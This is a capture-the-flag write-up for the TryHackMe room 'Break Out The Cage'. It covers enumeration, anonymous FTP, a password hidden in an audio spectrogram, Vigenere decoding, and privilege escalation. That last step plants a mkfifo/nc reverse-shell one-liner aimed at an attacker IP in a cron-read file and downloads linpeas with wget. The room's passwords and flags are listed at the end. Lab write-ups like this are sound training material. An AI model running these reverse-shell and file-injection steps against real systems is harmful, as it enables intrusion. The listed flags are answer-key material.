# Break Out The Cage - Easy

```shell
rustscan -a 10.10.184.103 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.184.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak

ftp 10.10.184.103
#anonymous login
#get 1 file

cat dad_tasks
#the file from ftp is encoded

#use sonic visualizer or audacity
#to view spectrogram of the corrupted mp3
#this gives us the password for ssh

ssh weston@10.10.184.103

#attempting privesc
history

cat /etc/crontab

sudo -l
#this contains a program /usr/bin/bees that we can run as root

/usr/bin/bees
#this prints a message

find / -perm -222 -type d 2>/dev/null
#find world writable folders

find / -perm -u=s -type f 2>/dev/null
#find files with suid bit set

#transfer linpeas.sh from attacker machine
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#edit .quotes file
echo "shell; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.31.212 5555 >/tmp/f" > /opt/.dads_scripts/.files/.quotes

#setup listener on attacker machine
nc -lvnp 5555

python3 -c 'import pty;pty.spawn("/bin/bash")'
#upgrade shell

#after getting shell
whoami
#we are cage now

cat Super_Duper_Checklist

ls -la

cat email_backup/email_1

cat email_backup/email_2

cat email_backup/email_3

#use vignere decode for the string found in email_3
#with key 'face' to get root password

ssh root@10.10.184.103
#login as root and get flag from email_2
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 7.6p1
  * 80 - ttp - Apache httpd 2.4.29 (Ubuntu)

Checking the webpage in general does not give us any clue, so we can use Gobuster to enumerate the directories.

Web directories:

  * /contracts
  * /html
  * /images
  * /scripts
  * /auditions

Also, we attempt to login FTP in anonymous mode and it works; it contains a file 'dad_tasks' which contains encoded text; when converted from base64, it gives rotated, jumbled text but I cannot decode it now.

The /contracts directory is empty and the /scripts directory contains generic dialogues.

From /images, I tried stego on a few images using tools such as exiftool, steghide, stegseek, binwalk and zsteg, but it didn't yield anything significant.

The /auditions page contains a .mp3 file with corrupted audio; this can hide something as well.

We can view the .mp3 file in a tool such as Sonic Visualiser; there is a section of audio which is clearly corrupted.

On viewing as a spectrogram, that particular section contains a block of text 'namelesstwo'.

Going back to the base64 encoded text, we can decode it if we use Vigenere Cipher Decode with key 'namelesstwo'.

This gives us a wall of plaintext, and it contains the passphrase "Mydadisghostrideraintthatcoolnocausehesonfirejokes"; we can use this as weston's password for SSH.

Once we connect via SSH, we can start off with checking basic privesc vectors.

We can also use linpeas.sh to check for the same.

linpeas shows that there are some group-writable files in /opt/.dads_scripts/.files

On closer inspection, we can see that quotes are printed on the screen, randomly chosen from the /.quotes file.

We can edit it to add a reverse-shell one-liner, and setup listener on our machine.

Within a minute or two, the program runs and we get shell on our listener as 'cage'.

User flag can be found in /home/cage/Super_Duper_Checklist

Now the /email_backup directory contains 3 emails, which have clues in them.

/email_2 shows that Sean is root, and /email_3 contains a string related to root password "haiinspsyanileph".

Using the Vignere decode for Weston's password using different keys, we can try to brute-force this; we manage to get plaintext password "cageisnotalegend" using the key 'face' - it is repeated several times in email_3.

Using the creds root:cageisnotalegend, we can SSH into the machine.

We can get root flag from /root/email_backup/email_2
```

1. What is Weston's password? - Mydadisghostrideraintthatcoolnocausehesonfirejokes

2. What's the user flag? - THM{M37AL_0R_P3N_T35T1NG}

3. What's the root flag? - THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
